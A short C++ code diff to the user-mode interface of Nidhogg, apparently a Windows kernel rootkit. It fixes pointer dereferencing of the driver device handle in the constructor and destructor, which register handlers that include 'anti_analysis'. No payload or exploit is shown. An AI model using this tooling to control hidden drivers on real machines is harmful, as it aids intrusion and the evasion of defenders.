@@ -4,7 +4,7 @@
 NidhoggInterface::NidhoggInterface() {
 	hNidhogg = std::make_shared<HANDLE>(CreateFileW(NIDHOGG_DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr));
 
-	if (!IsValidHandle(hNidhogg.get()))
+	if (!IsValidHandle(*hNidhogg.get()))
 		throw NidhoggInterfaceException("Failed to open Nidhogg device " + std::to_string(GetLastError()));
 	commandHandlers["anti_analysis"] = std::make_unique<AntiAnalysisHandler>(hNidhogg);
 	commandHandlers["file"] = std::make_unique<FileHandler>(hNidhogg);
@@ -16,8 +16,8 @@ NidhoggInterface::NidhoggInterface() {
 }
 
 NidhoggInterface::~NidhoggInterface() {
-	if (IsValidHandle(hNidhogg.get()))
-		CloseHandle(hNidhogg.get());
+	if (IsValidHandle(*hNidhogg.get()))
+		CloseHandle(*hNidhogg.get());
 }
 
 /*
